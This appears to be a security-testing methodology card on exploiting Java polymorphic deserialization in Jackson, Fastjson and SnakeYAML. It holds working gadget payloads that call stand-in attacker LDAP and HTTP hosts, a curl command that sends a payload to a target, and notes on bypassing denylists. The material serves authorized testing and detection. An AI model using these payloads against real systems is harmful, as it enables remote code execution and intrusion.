# Java Polymorphic JSON Deserialization

## Purpose

Test Java endpoints where JSON/YAML deserializers accept attacker-supplied type identifiers (`@class`, `@type`, `@JsonTypeInfo`, `!!`) that cause instantiation of arbitrary classes, enabling RCE through constructor/setter gadgets without requiring native Java serialization.

## Applicability

- Java application using Jackson (`ObjectMapper`), Fastjson, Gson with RuntimeTypeAdapter, or SnakeYAML
- JSON fields containing `@class`, `@type`, `_class`, or similar type discriminator keys
- API endpoints accepting polymorphic request bodies (`application/json`)
- Fastjson-specific: any endpoint accepting JSON with `@type` key from untrusted input

## Preconditions

- Jackson `enableDefaultTyping()` or `@JsonTypeInfo(use=Id.CLASS)` / `Id.MINIMAL_CLASS` on a field reachable from user input
- OR Fastjson parsing JSON with `autoType` enabled (default in older Fastjson versions)
- OR SnakeYAML `new Yaml().load()` (not `SafeConstructor`) accepting `!!` tags
- Gadget class available on classpath (e.g., `JdbcRowSetImpl`, `TemplatesImpl`, `C3P0`, `JNDI-capable` classes)

## Relevant Architecture

```
HTTP POST (application/json)
    → JSON string with attacker-controlled @class / @type
    → Jackson ObjectMapper / Fastjson JSON.parseObject
    → type lookup via classloader
    → constructor + setter invocation (populateBean)
    → gadget property set → JNDI lookup / ScriptEngine eval / file write
```

JNDI sub-path (JdbcRowSetImpl, JndiConverter, etc.):
```
setter(dataSourceName = "ldap://attacker/x")
    → Context.lookup("ldap://attacker/x")
    → remote reference / local ObjectFactory
    → RCE / SSRF
```

## Technical Knowledge

**Jackson enableDefaultTyping triggers**
```java
// Vulnerable configurations:
mapper.enableDefaultTyping();                              // Any class
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)                // Field-level
@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
```

**Jackson exploit payload (JdbcRowSetImpl — JNDI)**
```json
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker.com/x","autoCommit":true}]
```

**Jackson exploit payload (TemplatesImpl — requires PROPS_BASED_CREATOR flag)**
```json
["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{
  "_bytecodes":["<base64-of-malicious-class>"],
  "_name":"foo","_tfactory":{},"_outputProperties":{}
}]
```

**Fastjson payloads**
```json
// JdbcRowSetImpl (Fastjson < 1.2.48)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/x","autoCommit":true}

// TemplatesImpl
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["..."],"_name":"a","_tfactory":{},"outputProperties":{}}
```

**SnakeYAML unsafe load**
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/PoC.jar"]]]]
```

**Jackson denylist bypass history**
- Jackson maintains a blocklist of dangerous types; versions below 2.x.x allow certain classes
- `JdbcRowSetImpl` blocked from 2.9.x+ in some contexts — check exact version
- Alternative gadgets: `MysqlDataSource`, `C3P0`, `Shiro` chains — classpath dependent
- Fastjson has its own bypass history (1.2.24 → 1.2.47 → 1.2.68 bypasses)

**JNDI chain stages (model separately)**
1. Lookup invoked: `Context.lookup("ldap://attacker/x")`
2. Remote reference fetched from LDAP server
3. Remote codebase class loading (disabled by default in JDK 8u191+, 11.0.1+)
4. Deserialized object from LDAP attribute (separate `ObjectInputStream` deserialize)
5. Local `ObjectFactory` instantiation from returned reference
Each stage has independent runtime controls.

## Indicators

**Black-box**
- JSON response contains `@class` or `@type` keys echoed back
- Error: `com.fasterxml.jackson.databind.exc.InvalidTypeIdException` or `IllegalArgumentException: Illegal type`
- Error leaks class name: `Could not resolve type id 'com.example.SomeClass'`
- Application accepts `Content-Type: application/json` with a type field that changes behavior

**White-box**
```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();           // explicit global typing
// OR
@JsonTypeInfo(use = Id.CLASS)          // field annotation
// OR (Fastjson)
JSON.parseObject(input, Object.class); // parses @type from input
```

## Interpretation

1. `InvalidTypeIdException` referencing attacker-supplied class → type resolution happening; classpath enumeration possible via error messages
2. `ClassNotFoundException` for `com.sun.rowset.JdbcRowSetImpl` → JDK type, should exist; mapper may be blocking it → try alternate gadget
3. JNDI DNS callback received → JNDI lookup stage reached; test remote class loading or local factory fallback
4. 500 error with property-related exception (e.g., `BeanUtils`, `NullPointerException` in setter) → type instantiated but gadget misconfigured — adjust property names/values
5. No type discrimination in response → likely using concrete type deserialization; check for polymorphic sub-fields

## Security-Relevant Conditions

- **Jackson `enableDefaultTyping` globally** → any array-wrapped JSON with a class name is dangerous
- **`@JsonTypeInfo` on a specific field** → only that field path is exploitable; craft payload to reach it
- **Fastjson autoType=true (< 1.2.48)** → straightforward `@type` injection
- **Fastjson 1.2.48–1.2.68** → specific bypass payloads required; version fingerprinting critical
- **JDK >= 8u191**: Remote class loading via LDAP/RMI disabled by default — pivot to serialized object in LDAP attribute or local ObjectFactory gadget
- **Custom `deserializer`/`TypeResolverBuilder`** → inspect implementation; may restrict allowed types

## Experiment Considerations

- Start with a DNS-callback JNDI payload to confirm JNDI lookup is reachable (safe oracle)
- Fingerprint Jackson/Fastjson version from error messages, `X-Powered-By`, or jar manifest
- For TemplatesImpl gadgets: must compile a bytecode payload (malicious `.class` file) to embed in `_bytecodes`
- When remote class loading fails, enumerate local `ObjectFactory` implementations on the classpath
- Always test with interactsh/Collaborator before exec to minimize noise

## Evidence Expectations

1. JNDI DNS callback received → JNDI sink confirmed
2. Remote class loaded or local factory triggered → code execution path confirmed  
3. Bounded exec (`id`, `whoami`) returned OOB → RCE demonstrated
4. Document: exact JSON field path, type discriminator key (`@class`/`@type`), gadget class, JNDI URL scheme, JDK version, Jackson/Fastjson version

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `com.fasterxml.jackson.databind.exc.MismatchedInputException` | Type field present but mapper not in polymorphic mode |
| `IllegalArgumentException: Illegal type to deserialize: prevented for security reasons` | Jackson blocklist active; try alternate gadget or newer bypass |
| JNDI DNS fires but no exec | Remote class loading blocked; try serialized LDAP attribute or local factory |
| Fastjson accepts `@type` but instantiates safe class | autoType check denylist active; use known bypass for the version |
| No DNS callback | Egress filtered or lookup path not reached; test with `sleep`-based timing if DNS blocked |

## False Positives

- `@type` field present in JSON but application ignores it (parsed to `Map`, not `Object`) — confirm actual class instantiation via error or behavior change
- `enableDefaultTyping` set but input goes through a concrete-type `@RequestBody` — no polymorphism triggered
- Type field echoed in response but deserialization uses a separate schema-validated path

## Limitations

- Jackson denylist evolves across versions — a blocked gadget in 2.10 may work in 2.9
- Fastjson bypass techniques are version-specific; incorrect version assumption leads to false negatives
- JNDI chain reliability depends on JDK, LDAP server behavior, and local classpath — model stages independently
- SnakeYAML RCE via URLClassLoader requires outbound HTTP to attacker server; firewalled environments require local classpath gadget

## Related Knowledge

- `java-native` — when the sink is `ObjectInputStream` rather than a JSON/YAML mapper
- `rpc-hessian` — similar type confusion via Hessian binary protocol
- `signed-state` — when JSON blob is HMAC-protected
- Jackson CVE history: CVE-2017-7525, CVE-2019-12384, CVE-2020-36518 and related
- Fastjson CVE history: CVE-2017-18349, CVE-2019-14540, CVE-2020-35728

## Tooling

```bash
# Start OAST listener
interactsh-client &

# Confirm JNDI sink (DNS-only, safe)
# Payload (send as POST body):
# ["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://<interactsh-host>/a","autoCommit":true}]

# Fastjson check
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<interactsh-host>/a","autoCommit":true}' \
  https://target/api/endpoint

# TemplatesImpl bytecode generation (requires javassist or ysoserial helper)
# Use ysoserial's Serialization helper or write a custom __reduce__ equivalent in Java
# Embed resulting base64 bytecode in _bytecodes field
```

For JNDI staging: set up a simple LDAP server (e.g., marshalsec on a controlled host, used only from a reviewed, pinned commit) to serve a reference; prefer serialized-object-in-attribute approach over remote class loading on modern JDKs.